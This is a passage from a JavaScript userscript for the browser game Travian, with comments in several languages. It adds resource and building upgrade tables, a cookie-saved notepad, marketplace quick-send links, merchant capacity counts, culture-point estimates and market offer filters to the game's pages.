			[0, 3, 0, 1, 1, 1, 2, 3, 3, 2, 2, 3, 3, 0, 3, 1, 0, 1],
			[0, 3, 0, 2, 0, 1, 2, 3, 3, 2, 2, 3, 3, 0, 3, 1, 0, 1],
			[3, 3, 0, 2, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 1, 3, 3] // 15 cereales
		];

		find("//div[starts-with(@id, 'f')]", XPFirst).id.search(/f(\d)/);
		var tipo = RegExp.$1;

		// get all fields and fill the matrix with the levels detected
		for (var i = 1; i <= 18; i++){
			var a = find("//img[@class='rf" + i + "']", XPFirst);
			var title = find("//area[@href='build.php?id=" + i +"']", XPFirst).title;

			var resLink = $elem("A", "", {"title": title, "id": "RES" + i, "href": "build.php?id=" + i, "class": "rf" + i});
			var aDIV = $elem("DIV", "", {"title": title, "id": 'Res' + i, "class": 'CNbuildingtags'}, {}, resLink);
			//aDIV.className = 'CNresLevel';
			if (posDIV)
				posDIV.appendChild(resLink);
			var crtLevel = 0;

			if (a){
				a.src.search(/\/s(\d+).gif$/);
				crtLevel = parseInt(RegExp.$1);
				grid[dist[tipo - 1][i - 1]][crtLevel] = i;
			} else {
				grid[dist[tipo - 1][i - 1]][0] = i;
				crtLevel = 0;
			}

				initvillinfo2 = readCookie("initvillinfo2" + server);
			if (initvillinfo2 == true || initvillinfo2 == null)
			{
				// by ms99, Nux
				if ((boolIsThisTheCapital) || (!boolIsThisTheCapital && crtLevel < 10)){
					//select resource type
					var boolNotUpgradable = false;
					var boolIsUpgradableViaNPC = false;
					var neededTotalRes = 0;
					eval('var nameStruct = ' + gidToName[parseInt(dist[tipo - 1][i - 1]) + 1] + 'Cost;');
					for (k = 0; k < 4; k++) {
						if (actual[k] < nameStruct[crtLevel + 1][k]) {
							boolNotUpgradable = true;
						}
						neededTotalRes += nameStruct[crtLevel + 1][k]
					}
					if (neededTotalRes <= currentTotalRes) {
						boolIsUpgradableViaNPC = true;
					}
					if (boolIsUpgradableViaNPC && boolNotUpgradable) {
						aDIV.style.visibility = 'visible';
						aDIV.style.backgroundColor = CN_COLOR_UPGRADABLE_VIA_NPC;
					} else if (boolNotUpgradable) {
						aDIV.style.visibility = 'visible';
						aDIV.style.backgroundColor = CN_COLOR_NO_UPGRADE;
					}
				} else {
					aDIV.style.visibility = 'visible';
					aDIV.style.backgroundColor = CN_COLOR_MAX_LEVEL;
				}
				aDIV.innerHTML = '' + crtLevel;
			}
		}
		var tableaudorf1 = readCookie("tableaudorf1" + server);
		if (tableaudorf1 == true || tableaudorf1 == null)
		{
			// Crea una tabla mostrando por cada tipo de recurso un representante de cada nivel que se ha encontrado
			// Muestra al lado de cada uno los recursos y tiempo restantes hasta poder subirlo de nivel
			var table = $elem('TABLE', '', {
				"id": "resumen",
				"class": "tbg",
				"align": textDirection == "ltr" ? "left" : "right",
				"cellspacing": "1",
				"cellpadding": "2"
			}, {"clear":"both"});
			var fila1 = $elem('TR', '',
			{
				'class': 'rbg'
			}, {}, table);
			var fila2 = $elem('TR', "", {}, {}, table);
			for (var i = 0; i < 4; i++)
			{
				var td1 = $elem('TD', '<img src="' + img('r/' + (i + 1) + '.gif') + '" width="18" height="12" border="0" title="' + T('RECURSO' + (i + 1)) + '">', {}, {}, fila1);
				//	var td1 = $elem('TD', '<img src="data:image/gif;base64,' + imagenes["img"+(i+1)] + '" width="18" height="12" border="0" title="' + T('RECURSO' + (i+1)) + '">');

				var td2 = $elem('TD', '', {
					'width': '25%',
					'valign': 'top'
				}, {}, fila2);

				var table2 = $elem('TABLE', '', {
					'align': 'center',
					'valign': 'top'
					}, {}, td2);
				for (var j = 0; j < maxlvl; j++)
				{
					if (grid[i][j] > 0 && buildingCost[i][j + 1] != null)
					{
						datos = 1;
						var fila3 = $elem('TR');
						imgx = readCookie("imgx");
						if (imgx == true || imgx == null)
						{
							var imagen = '<a href="/build.php?id=' + grid[i][j] + '"><div style="width: 0%;"><img src="' + imagenes["r" + i] + '"border="0" title="' + T('RECURSO' + (i + 1)) + '">';
						}
						else
						{
							var imagen = '<a href="/build.php?id=' + grid[i][j] + '"><div style="width: 0%;"><img src="' + img('m/zz' + (i + 1) + '.gif') + '"border="0" title="' + T('RECURSO' + (i + 1)) + '">'
						}
						// TMR
						// changed this to use (j+1) so it shows what i'm upgrading to, not upgrading from
						if (j > 0)
						{
							imagen += '<img src="' + img('g/s/s' + j + '.gif') + '" style="position:relative; bottom:51px; ' + ((textDirection == 'ltr') ? 'left' : 'right') + ':27px;" height="12" border="0">';
						}
						//	imagen += '<img src="data:image/gif;base64,' + imagenes["s" + j] + '" style="position:relative; bottom:53px; left:26px;"height="12" border="0">';
						imagen += '</div>';
						var td = $elem("TD", imagen, {}, {}, fila3);

						var restante = calculateResourceTime(buildingCost[i][j + 1]);
						var td3 = $elem('TD', '', {}, {
							'color': '#808080',
							'fontSize': '11px',
							'verticalAlign': 'top'
						}, fila3);
						table2.appendChild(fila3);

						if (restante != null)
						{
							td3.setAttribute('valign', 'bottom');
							td3.innerHTML = restante;
						}
						else
						{
							td3.setAttribute('valign', 'center');
							td3.innerHTML = '<br/><a style="color: #FF8C00"; "href="build.php?id=' + grid[i][j] + '>' + T('SUBIR_NIVEL') + '</a>';
						}
					}
				}
			}
			if (datos == 1)
			{
				var middleblock = get('lmidall');
				if(textDirection != "rtl")
				{
					middleblock.appendChild($elem('BR'));
				}else
				{
					var TableY = longitudPantalla() + 'px';
					table.style.top = TableY;
					table.style.position = "absolute";
				}
				middleblock.appendChild(table);
			}
		}
	}

	/** Faire une page de résumé des bâtiments dans le village */
	function preCalculate2()
	{
		tableaudorf2 = readCookie("tableaudorf2" + server);
		if (tableaudorf2 == true || tableaudorf2 == null)
		{
			var edificiosPorFila = 4; // hany epulet legyen egy sorban
			var datos = 0;
			var buildingsImages = new Array();
			var buildingsDescs = new Array();
			var buildingsLinks = new Array();

			// recoge los nombres de cada uno
			var xpathResult = find('//map[@name="map1"]/area/@title', XPIter);
			while ((buildingsDescs[buildingsDescs.length] = xpathResult.iterateNext()))
			{
			}

			// los enlaces para acceder directamente a ellos
			xpathResult = find('//map[@name="map1"]/area/@href', XPIter);
			while ((buildingsLinks[buildingsLinks.length] = xpathResult.iterateNext()))
			{
			}

			// Procesa as imagenes de los edificios
			var xpathResult = find('//div[@id="lmid2"]/img/@src', XPIter);
			buildingsImages[0] = document.createTextNode(img("g/g16.gif"));
			while ((buildingsImages[buildingsImages.length] = xpathResult.iterateNext()))
			{
			}
			// Soporte para murallas
			var a = find("//div[starts-with(@class, 'd2_x')]", XPFirst);
			if (a)
			{
				switch (a.className)
				{
					case 'd2_x d2_0':
						break;
					case 'd2_x d2_1':
						var b = "g/g31.gif";
						break;
					case 'd2_x d2_11':
						var b = "g/g32.gif";
						break;
					case 'd2_x d2_12':
						var b = "g/g33.gif";
						break;
				}
				if (b)
					buildingsImages[buildingsDescs.length - 4] = document.createTextNode(img(b));
			}

			var table = $elem('TABLE', '', {
				"id": "resumen",
				"class": "tbg",
				"align": textDirection == "ltr" ? "left" : "right",
				"cellspacing": "1",
				"cellpadding": "2"
			}, {"clear":"both"});
			var j = 0;
			for (var i = 0; i < buildingsDescs.length - 3; i++)
			{
				if (buildingsDescs[i] != null && basename(buildingsImages[i].nodeValue) != 'iso.gif')
				{
					// Por cada edificio se recoge su nivel y su codigo en el juego
					var buildingLevel = buildingsDescs[i].nodeValue.split(" ");
					buildingLevel = parseInt(buildingLevel[buildingLevel.length - 1]);

					var buildingCode = buildingsImages[i].nodeValue.split("/");
					buildingCode = buildingCode[buildingCode.length - 1].split(".");
					if (buildingCode[0].search(/(\d+)/))
						buildingCode = parseInt(RegExp.$1);
					//				buildingCode = parseInt(buildingCode[0].substring(1, buildingCode[0].length));

					// Si es actualizable se muestra junto con los recursos que necesita
					if (buildingCost[buildingCode] != null && buildingCost[buildingCode][buildingLevel + 1] != null)
					{
						// Se reparten los edificios entre las columnas disponibles en las filas que haga falta
						if (j % edificiosPorFila == 0)
						{
							var fila = $elem('TR');
							table.appendChild(fila);
						}
						j++;
						datos = 1;

						// Soporte para murallas
						switch (buildingCode)
						{
							//31,32,33 - palisade, wall, earth wall
							case 31:
								buildingsImages[i].nodeValue = imagenes["empalizada"];
								break;
							case 32:
								buildingsImages[i].nodeValue = imagenes["muralla"];
								break;
							case 33:
								buildingsImages[i].nodeValue = imagenes["terraplen"];
								break;
						}

						var td = $elem("TD", '', {
							'width': '25%',
							'valign': 'bottom'
						}, {}, fila);

						var table2 = $elem('TABLE', '', {
							"align": "left",
							'class': 'bttable'
						}, {}, td);

						var nametr = $elem('TR', '', {}, {}, table2);

						var tdLink = '<a style="font-size:13px" href="' + buildingsLinks[i].nodeValue + '">' + buildingsDescs[i].nodeValue + '</a>';
						var nametd = $elem('TD', tdLink, {
							'colspan': '2',
							'class': 'f10'
						}, {}, nametr);

						var fila2 = $elem('TR', '', {}, {}, table2);

						var tdLink = '<a href="' + buildingsLinks[i].nodeValue + '"><img src="' + buildingsImages[i].nodeValue + '"border="0"></a>';
						var td2 = $elem("TD", tdLink, {
							'class': 'f10'
						}, {}, fila2);

						var restante = calculateResourceTime(buildingCost[buildingCode][buildingLevel + 1]);
						var td3 = $elem("TD", '', {
							'valign': 'bottom'
						}, {
							'color': '#808080',
							'fontSize': '11px',
							'verticalAlign': 'top'
						}, fila2);

						if (restante != null)
						{
							td3.setAttribute('valign', 'bottom');
							td3.innerHTML = restante;
						}
						else
						{
							td3.setAttribute('valign', 'center');
							td3.innerHTML = '<br/><a href="' + buildingsLinks[i].nodeValue + '" style="color: #FF8C00">' + T('SUBIR_NIVEL') + '</a>';
						}
					}
				}
			}
			while (j % edificiosPorFila != 0)
			{
				fila.appendChild($elem("TD"));
				j++;
			}
			if (datos == 1)
			{
				var middleblock = get('lmidall');
				if(textDirection != "rtl")
				{
					middleblock.appendChild($elem('BR'));
				}else
				{
					var TableY = longitudPantalla() + 'px';
					table.style.top = TableY;
					table.style.position = "absolute";
				}
				middleblock.appendChild(table);
			}
		}
	}

	/**  Commander par ordre croissant et décroissant
	 *
	 * Params:
	 * 	sTableID: 	ID de la tabla a ordenar
	 * 	iCol: 		Indice de la columna a ordenar
	 * 	sDataType:	Tipo de datos de la columna, valor por defecto:texto
	 */
	function sortTable(sTableID, iCol, sDataType)
	{
		return function()
		{
			var oTable = get(sTableID);
			var oTBody = oTable.tBodies[0];
			var colDataRows = oTBody.rows;
			var aTRs = new Array;

			for (var i = 0; i < colDataRows.length; i++)
				aTRs[i] = colDataRows[i];
			if (oTable.getAttribute("sortCol") == iCol)
				aTRs.reverse();
			else
				aTRs.sort(generateCompareTRs(iCol, sDataType));

			var oFragment = document.createDocumentFragment();
			for (var i = 0; i < aTRs.length; i++)
				oFragment.appendChild(aTRs[i]);

			oTBody.appendChild(oFragment);
			oTable.setAttribute("sortCol", iCol);
		};
	}

	function convert(element, sDataType)
	{
		switch (sDataType)
		{
			case "int":
				return ((element.nodeValue == null) || !element.nodeValue.match(/\d+/)) ? 0 : parseInt(element.nodeValue);
			case "float":
				return ((element.nodeValue == null) || !element.nodeValue.match(/\d+/)) ? 0 : parseFloat(element.nodeValue);
			//default: return (element == null) ? '' : element.nodeValue.toString().toLowerCase();
			default:
				return (element == null) ? '' : element.textContent.toLowerCase();
		}
	}

	function generateCompareTRs(iCol, sDataType)
	{
		return function compareTRs(oTR1, oTR2)
		{
			var vValue1 = convert(oTR1.cells[iCol].firstChild, sDataType);
			var vValue2 = convert(oTR2.cells[iCol].firstChild, sDataType);

			if (vValue1 < vValue2)
				return -1;
			else
				if (vValue1 > vValue2)
					return 1;
				else
					return 0;
		};
	}

	/** La mise en œuvre et affiche un bloc-notes. */
	function blocNotas2(a)
	{
		// Carga las notas previas si existen
		var notas = readCookie("notas_" + server);
		notas = (notas) ? unescape(notas) : '';

		// Crea la estructura HTML del bloc
		var tabla = $elem("TABLE", '', {"width": "280"}, {"whiteSpace": "normal"});
		var tr = $elem("TR", '', {}, {}, tabla);
		var td = $elem("TD", '', {"align": "center"}, {}, tr);

		if (notas != null && notas != '')
			var nl = notas.split("\n").length;
		nl = (nl > 20) ? 20 : (nl > 1) ? nl-1 : 1;

		var imh = $elem("IMG", '', {
			'width': '265',
			"src": img('msg/block_bg21.gif', true)
		}, {}, td);
		var textarea = $elem("TEXTAREA", notas, {
			"cols": "30",
			"rows": nl
		}, {
			'backgroundImage': 'url(' + img('msg/underline.gif', true) + ')',
			'border': '0px',
			'overflow': 'auto'
		}, td);
		$elem("img", "", {
			"width": "265",
			"src": img("msg/block_bg23.gif", true)
		}, {}, td);
		var p = $elem("P", '', {}, {
			'marginTop': '0px',
			'marginBottom': '0px'
		}, td);
		var input = $elem("INPUT", '', {
			"type": "image",
			"border": "0",
			"src": img('b/s1.gif', true)
		}, {}, p);
		input.addEventListener("click", function()
		{
			createCookie("notas_" + server, escape(textarea.value), 365);
			alert(T('GUARDADO'));
			removeElement('marcadores');
			mostrarMarcadores();
		}, 0);
		a.appendChild(tabla);
	}

	/** Créer une nouvelle colonne dans le marché propose de montrer l'alliance de fournisseurs*/
	function alianzaMercado()
	{
		if (find("//tr[@class='rbg']", XPFirst) == null)
			return;
		var a = find("//tr[@class='rbg']", XPFirst).parentNode;
		// Prepara la insercion de la nueva columna
		var b = $tags("tr", a);
		// FIXME: Apa�o para Firefox. FF mete nodos de tipo texto vacios
		b[0].childNodes[b[0].childNodes.length == 3 ? 1 : 0].setAttribute('colspan', '8');

		if (b[b.length - 1].childNodes[0].tagName == 'TD')
			b[b.length - 1].childNodes[0].setAttribute("colspan", "8");
		else
			return;

		// Crea e inserta la columna
		var columna = $elem("TD");
		columna.innerHTML = T('ALIANZA');
		b[1].appendChild(columna);

		// Rellena la columna con los nombres de las alianzas
		for (var i = 2; i < b.length - 1; i++)
		{
			var alianza = $elem("TD");
			// FIXME: Apa�o para Firefox. FF mete nodos de tipo texto vacios
			var alianza_txt = b[i].childNodes[b[i].childNodes.length == 12 ? 8 : 4].getAttribute('title');
			if (alianza_txt != null)
				alianza.innerHTML = alianza_txt;
			b[i].appendChild(alianza);
		}
	}




	/** Créer une fonction qui traite les cas de sélection d'une quantité d'un  envoie de matières premières
	 * desde el mercado
	 *
	 * Params:
	 *	recurso:	Ordinal del recurso
	 *	cantidad:	Cantidad a incrementar del determinado recurso
	 *
	 * Returns:
	 *	La funcion que gestiona el evento
	 */
	function crearEventoRecursosMercado(recurso, cantidad)
	{
		return function()
		{
			var max_capacidad = parseInt(find("//p//b", XPFirst).innerHTML);
			var max_comercian = parseInt(find("//table[@class='f10']//tr//td[@colspan='2']", XPFirst).innerHTML.split(' ')[1].split('/')[0]);
			var max_transport = max_capacidad * max_comercian;
			if(typeof(cantidad) == "string")
			{
				var spentResource = 0;
				var val;
				for(var i = 0; i < 4; i++)
					if (!isNaN(val = parseInt($tags('input')[i + 1].value)) && i != recurso)
						spentResource += parseInt(val);

				var updateValue = max_transport - spentResource;
				$tags('input')[recurso + 1].value = ((actual[recurso] <=  updateValue) ? actual[recurso] : updateValue);
				dispatchOnChange($tags('input')[recurso + 1]);
				return;
			}
			var a = $tags('input')[recurso + 1].value;
			if (a == '')
				var suma = 0;
			else
				var suma = parseInt(a);
			suma += cantidad;
			// La quantité à envoyer ne peut pas dépasser ce qui est disponible
			if (suma > actual[recurso])
				suma = actual[recurso];
			// La quantité à envoyer ne doit pas pouvoir dépasser la capacité des commerçants disponibles

			if (suma > max_transport)
				suma = max_transport;

			$tags('input')[recurso + 1].value = suma;
			dispatchOnChange($tags('input')[recurso + 1]);

		}
	}

	function crearEventoRecursosMercado_ALL(cantidad)
	{
		return function()
		{
			var max_capacidad = parseInt(find("//p//b", XPFirst).innerHTML);
			var max_comercian = parseInt(find("//table[@class='f10']//tr//td[@colspan='2']", XPFirst).innerHTML.split(' ')[1].split('/')[0]);
			var max_transport = max_capacidad * max_comercian;

			var inputs = $tags('input');

			if(typeof(cantidad) == "string")
	        {
				for(var i = 0; i < 5; i++)
				{
					var spentResource = 0;
					var val;
					for(var j = 0; j < 4; j++)
						if (!isNaN(val = parseInt(inputs[j + 1].value)))
							spentResource += parseInt(val);

					if(i == 4) // Avoid to put resources lost by decimal values
					{
						if(spentResource != max_transport)
						{
							var resLeft = max_transport - spentResource;
							var distArr = new Array(0,0,0,0);
							distArr[0] = distArr[1] = parseInt(resLeft - 2*resLeft/3);
							distArr[2] = resLeft - distArr[0] - distArr[1];
							for(var k = 0; k < 3; k++)
							{
								if(actual[k] >= distArr[k])
									inputs[k + 1].value = parseInt(inputs[k + 1].value) + distArr[k];
								else
									distArr[k+1] += distArr[k];
							}
						}
					}
					else
					{


						val = parseInt(inputs[i + 1].value);
						val = ((isNaN(val))?0:val);
						var updateValue = parseInt(val + ((max_transport - spentResource)/ (4-i)));
						inputs[i + 1].value = ((actual[i] <=  updateValue) ? actual[i] : updateValue);

					}
				}
				dispatchOnChange(inputs[1]);
				return;
			}


			var recurso = 0;
			for (var j = 0; j < 4; j++)
			{
				recurso = j;
				var a = $tags('input')[recurso + 1].value;
				if (a == '')
					var suma = 0;
				else
					var suma = parseInt(a);
				if (cantidad != 0)
				{
					suma += cantidad;
				}
				else
				{
					suma = 0;
				}
				// La cantidad a enviar no puede superar lo disponible
				if (suma > actual[recurso])
					suma = actual[recurso];
				// La cantidad a enviar no debe poder superar la capacidad de los comerciantes disponibles

				if (suma > max_transport)
					suma = max_transport;

				$tags('input')[recurso + 1].value = suma;
			}
			dispatchOnChange($tags('input')[recurso]); // Dispatches the event only once...
		}
	}

	function updateMerchantTotal()
	{
		if (find("//input[@type='Text'] | //input[@type='text']", XPList).snapshotLength != 7)
			return;

		if(!get('merchantTotal'))
		{
			var okButton = find("//input[@name='s1']", XPFirst);
			var merchEff = $elem('p', T('TOTAL') + ': <span id="merchantTotal">0</span> ('+T('MARC')+': <span id="merchantCount">0</span>, '+T('WASTED_SPACE')+': <span id="capacityWasted">0</span>)',{}, {'fontWeight':'bolder'});
			okButton.parentNode.insertBefore(merchEff, okButton);
			for (var i = 1; i <= 4; i++)
			{
				var resInput = find("//input[@name='r" + i + "']", XPFirst);
				resInput.addEventListener("keyup", function() { updateMerchantTotal(); }, 0);
				resInput.addEventListener("change", function() { updateMerchantTotal(); }, 0);
			}
		}

		var total = 0;
		for (var i = 1; i <= 4; i++)
		{
			var num = parseInt(find("//input[@name='r" + i + "']", XPFirst).value);
			if (!isNaN(num))
				total += num;
		}
		get("merchantTotal").innerHTML = total;
		var tmp = find("//table[@class='f10']//td[@colspan='2']", XPFirst).innerHTML;
		var merchantsAvailable = parseInt(tmp.substr(tmp.indexOf(' '),tmp.indexOf('/')));
		var merchantCapacity = parseInt(find("//p//b", XPFirst).innerHTML);
		var merchantCount = total ? parseInt(total / merchantCapacity) : 0;
		var extra = total % merchantCapacity;
		if (extra)
			merchantCount++;

		get("merchantTotal").parentNode.style.color = ((merchantCount > merchantsAvailable) ? 'red' : 'black');
		var capacityWasted = merchantCount * merchantCapacity - total;
		get("merchantCount").innerHTML = merchantCount;
		get("capacityWasted").innerHTML = capacityWasted;
	}

	/** Il insère de nouvelles quantités sélectionnables en envoyant des ressources depuis le marché */
	function recursosMercado()
	{
		if (find("//input[@type='Text'] | //input[@type='text']", XPList).snapshotLength != 7)
			return;
		var span = find("//table[@class='f10']//input[@name='x']//ancestor::span", XPFirst);
		if (span)
			span.setAttribute("style", "white-space: nowrap;");
		// Array con las nuevas cantidades
		var max_capacidad = parseInt(find("//p//b", XPFirst).innerHTML);

		var cantidades = [100, 250, 500, 1000, "Max"];
		var repetido = false;
		for (var i = 0; i < cantidades.length; i++)
			if (max_capacidad == cantidades[i])
			{
				repetido = true;
				break;
			}
		if (!repetido)
			cantidades = [100, 250, 500, 1000, max_capacidad, "Max"];

		if (max_capacidad == null)
		{
			max_capacidad = 500;
		}
		//var cantidades =[max_capacidad,max_capacidad*2,max_capacidad*3,max_capacidad*4]
		var a = find("//table[@class='f10']", XPFirst);
		var k = 0;
		// FIXME: Apanyo para Firefox. FF mete nodos de tipo texto vacios
		a = a.childNodes[a.childNodes.length == 2 ? 1 : 0].childNodes;
		for (var i = 0; i < a.length; a.length == 8 ? i += 2 : i++)
		{
			// Se eliminan las posibilidades originales
			// FIXME: Apanyo para Firefox. FF mete nodos de tipo texto vacios
			a[i].removeChild(a[i].childNodes[a[i].childNodes.length > 4 ? 5 : 3]);

			// Por cada nueva cantidad y recurso se crea un enlace con el evento asociado
			for (var j = 0; j < cantidades.length; j++)
			{
				var enlace = $elem('A', '(' + cantidades[j] + ')', {"href": "javascript:void(0)"}, {'fontSize':'11px'}, a[i]);

				enlace.addEventListener('click', crearEventoRecursosMercado(k, cantidades[j]), false);
			}
			k++;
		}

		//add code by Arrack
		//var a = $elem('DIV');
		var a = find("//p[@class='txt_menue']", XPFirst);
		var b = $elem('DIV', T('ADD_ALL') + ':', {}, {
			'padding-top': '5px',
			'backgroundColor': '#FFFFCC'
		}, a);

		for (var j = 0; j < cantidades.length; j++)
		{
			var enlace = $elem('A', '(' + cantidades[j] + ')', {
				'href': 'javascript:void(0)'
			}, {}, b);
			enlace.addEventListener('click', crearEventoRecursosMercado_ALL(cantidades[j]), false);
		}

		var enlace = $elem('A', '<font color=#FF0000><i>' + T('CLEAN') + '</i></font>', {
			'href': 'javascript:void(0)'
		}, {}, b);
		enlace.addEventListener('click', crearEventoRecursosMercado_ALL(0), false);
	}



	/** Il calcule le nombre de villages selon les points de la culture.
	 * Funcion estandard no valida para version Speed
	 *
	 * Params:
	 *	puntos: cantidad de puntos de cultura
	 *
	 * Returns:
	 * 	el numero de aldeas que se dispone con esos puntos
	 */
	function pc2aldeas(puntos)
	{
		if (document.domain.indexOf("speed") > -1)
		{
			return Math.round(Math.pow((puntos / 100) / 16 * 3, 1 / 2.3));
		}
		return Math.round(Math.pow((puntos / 1000) / 1.6, 1 / 2.3));
	}

	/** Il calcule le nombre de points requis pour produire une certaine quantité de villages
	 * Funcion estandard no valida para version Speed
	 *
	 * Params:
	 *	aldeas: numero de aldeas
	 *
	 * Returns:
	 * 	cantidad de puntos de cultura necesarios
	 */
	function aldeas2pc(aldeas)
	{
		if (document.domain.indexOf("speed") > -1)
		{
			return Math.round(16 / 3 * Math.pow(aldeas, 2.3)) * 100;
		}
		return Math.round(1.6 * Math.pow(aldeas, 2.3)) * 1000;
	}

	/**Il calcule et affiche la culture de points nécessaires pour le prochain village et le temps pour atteindre cet objectif, ou autres villages que l'on peut trouver avec l'actuel points */
	function puntosCultura()
	{
		var a = find("//div[@id='lmid2']//b", XPList);
		if (a.snapshotLength != 5)
			return;

		// Produccion de puntos de cultura de todas las aldeas
		var pc_prod_total = parseInt(a.snapshotItem(2).innerHTML);
		// Cantidad de puntos de cultura actuales
		var pc_actual = parseInt(a.snapshotItem(3).innerHTML);
		// Puntos de cultura necesarios para fundar la siguiente aldea
		var pc_aldea_prox = parseInt(a.snapshotItem(4).innerHTML);

		// Numero de aldeas actuales
		var aldeas_actuales = pc2aldeas(pc_aldea_prox);
		// Numero de aldeas que se pueden tener con los PC actuales
		var aldeas_posibles = pc2aldeas(pc_actual);
		var texto = new Array();
		texto.push('<table class="tbg" align="center" cellspacing="1" cellpadding="2"><tr class="rbg" style="font-weight:bold;"><td>' + T('ALDEA') + '</td><td>' + T('PC') + "</td></tr>");
		for (var i = 0; i < 6; i++)
		{
			texto.push('<tr><td>' + (aldeas_actuales + i + 1) + '</td><td>');

			// PC necesarios para conseguir la siguiente aldea
			var pc_necesarios = aldeas2pc(aldeas_actuales + i);

			// Si hay PC de sobra
			if (pc_necesarios < pc_actual)
				texto.push(T('FUNDAR'));
			else
			{
				// Tiempo en segundos hasta conseguir los puntos de cultura necesarios
				var tiempo = ((pc_necesarios - pc_actual) / pc_prod_total) * 86400;

				var fecha = new Date();
				fecha.setTime(fecha.getTime() + (tiempo * 1000));
				var texto_tiempo = calcularTextoTiempo(fecha);

				texto.push(T('FALTA') + ' <b>' + (pc_necesarios - pc_actual) + '</b> ' + T('PC') + '<br/>');
				texto.push(T('LISTO') + " " + texto_tiempo);
			}
			texto.push('</td></tr>');
		}
		texto.push('</table>');

		a.snapshotItem(4).parentNode.innerHTML += "<p>" + texto.join('') + "</p>";
	}

	/** Oculta un elemento y le asgina un atributo de tipo filtro
	 *
	 * Params:
	 *	oferta: elemento a modificar
	 *	filtro: nombre del filtro que se le aplicara como atributo
	 */
	function asignarFiltro(oferta, filtro)
	{
		oferta.setAttribute("style", "display:none");
		oferta.setAttribute("filtro" + filtro, "on");
	}

	/** Elimina un atributo de tipo filtro de un elemento y elimina su estilo si no tiene ningun filtro activo
	 *
	 * Params:
	 *	oferta: elemento a modificar
	 *	filtro: nombre del filtro a quitar
	 *	filtros: lista de filtros a comprobar para quitar el estilo
	 */
	function quitarFiltro(oferta, filtro, filtros)
	{
		oferta.removeAttribute("filtro" + filtro);
		var remove = true;
		for (var i = 0; i < filtros.length; i++)
			if (oferta.getAttribute("filtro" + filtros[i]) == 'on')
				remove = false;
		if (remove == true)
			oferta.removeAttribute("style");
	}

	/** Il crée la fonction qui gère les filtres sur le marché
	 *
	 * Param:
	 *	tipo	Tipo de filtro (0 para ofrezco, 1 para busco y 2 para tipo)
	 *	recurso	Recurso del filtro (0-4 recursos basicos, 5 para cualquiera)
	 *
	 * Returns:
	 *	La funcion que gestiona el evento
	 */
	function funcionFiltrosMercado(tipo, recurso){
		var funcion = function ()
		{
			var a = find("//table[@cellspacing='1' and @cellpadding='2' and @class='tbg' and not(@style)]//tr[not(@class)]", XPList);
			for (var i = 0; i < a.snapshotLength - 1; i++)
			{
				var b = a.snapshotItem(i);
				// FIXME:  para Firefox. FF mete nodos de tipo texto vacios
				if (b.childNodes.length > 8)
					var error = true;
				else
					var error = false;
				b.childNodes[error ? 1 : 0].firstChild.src.search(/\/(\d).gif$/);
				var ofrezco = RegExp.$1;
				b.childNodes[error ? 4 : 2].firstChild.src.search(/\/(\d).gif$/);
				var busco = RegExp.$1;
				var ofrezco_cantidad = parseInt(b.childNodes[error ? 2 : 1].innerHTML);
				var busco_cantidad = parseInt(b.childNodes[error ? 6 : 3].innerHTML);
				if (b.childNodes[error ? 11 : 6].className == 'c')
					var carencia = true;
				else
					var carencia = false;
				var tiempo = calcular_segundos(b.childNodes[error ? 10 : 5].innerHTML);


				// Para mantener 4 filtros activos a la vez sobre cada oferta, utiliza 3 atributos distintos
				// sobre cada fila
				switch(tipo)
				{
					case 0:
						if ((ofrezco != recurso) && recurso != 5)
							asignarFiltro(b, "Ofrezco");
						else
							quitarFiltro(b, "Ofrezco", ["Busco", "Tipo", "Carencia", "Tiempo"]);
						break;

					case 1:
						if ((busco != recurso) && recurso != 5)
							asignarFiltro(b, "Busco");
						else
							quitarFiltro(b, "Busco", ["Ofrezco", "Tipo", "Carencia", "Tiempo"]);
						break;

					case 2:
						switch(recurso)
						{
							case 1:
								if (ofrezco_cantidad != busco_cantidad)
									asignarFiltro(b, "Tipo");
								else
									quitarFiltro(b, "Tipo", ["Ofrezco", "Busco", "Carencia", "Tiempo"]);
								break;

							case 2:
								if (ofrezco_cantidad <= busco_cantidad)
									asignarFiltro(b, "Tipo");
								else
									quitarFiltro(b, "Tipo", ["Ofrezco", "Busco", "Carencia", "Tiempo"]);
								break;

							case 3:
								if (ofrezco_cantidad >= busco_cantidad)
									asignarFiltro(b, "Tipo");
								else
									quitarFiltro(b, "Tipo", ["Ofrezco", "Busco", "Carencia", "Tiempo"]);
								break;

							case 4:
								quitarFiltro(b, "Tipo", ["Ofrezco", "Busco", "Carencia", "Tiempo"]);
								break;
						}
						break;

					case 3:
						switch(recurso)
						{
							case 1:
								if (carencia == true)
									asignarFiltro(b, "Carencia");
								else
									quitarFiltro(b, "Carencia", ["Ofrezco", "Busco", "Tipo", "Tiempo"]);
								break;
							case 2:
								quitarFiltro(b, "Carencia", ["Ofrezco", "Busco", "Tipo", "Tiempo"]);
							break;
						}
						break;

					case 4:
						switch(recurso)
						{
							case 1:
								if (tiempo > (60*60))
									asignarFiltro(b, "Tiempo");
								else
									quitarFiltro(b, "Tiempo", ["Ofrezco", "Busco", "Tipo", "Carencia"]);
								break;

							case 2:
								if (tiempo > (2*60*60))
									asignarFiltro(b, "Tiempo");
								else
									quitarFiltro(b, "Tiempo", ["Ofrezco", "Busco", "Tipo", "Carencia"]);
								break;

							case 3:
								if (tiempo > (3*60*60))
									asignarFiltro(b, "Tiempo");
								else
									quitarFiltro(b, "Tiempo", ["Ofrezco", "Busco", "Tipo", "Carencia"]);
							break;

							case 4:
								quitarFiltro(b, "Tiempo", ["Ofrezco", "Busco", "Tipo", "Carencia"]);
							break;
						}
						break;
				}
			}
			// Para mantener un unico sombreado por cada filtro, activa el que se ha seleccionado y elimina
			// el resto de su tipo
			for (var i = 0; i < 5; i++)
			{
				for (var j = 0; j < 6; j++)
				{
					var a = find("//td[@id='filtro" + i + j + "']", XPFirst);
					if (a)
					{
						if (i == tipo && j == (recurso - 1))
						{
							a.setAttribute("style", "background-color:#F5F5F5");
						}
						else
							if (i == tipo)
							{
								a.removeAttribute("style");
							}
					}
				}
			}
		}
		return funcion;
	}

		/** Définissez des filtres pour chaque type de ressource et la proportion de l'offre d'échange pour la vente au marché */
	function filtrosMercado()
	{
		var table = $elem("TABLE", '', {
			'class': 'tbg',
			"cellspacing": "1",
			"cellpadding": "2"
		}, {
			'width': '100%'
		});

		// Se crea la tabla con 3 filas, Ofrezco, Busco y Tipo
		var etiquetas = [T('OFREZCO'), T('BUSCO')];
		for (var j = 0; j < 2; j++)
		{
			var tr = $elem("TR", '', {}, {}, table);
			$elem("TD", etiquetas[j], {}, {}, tr);
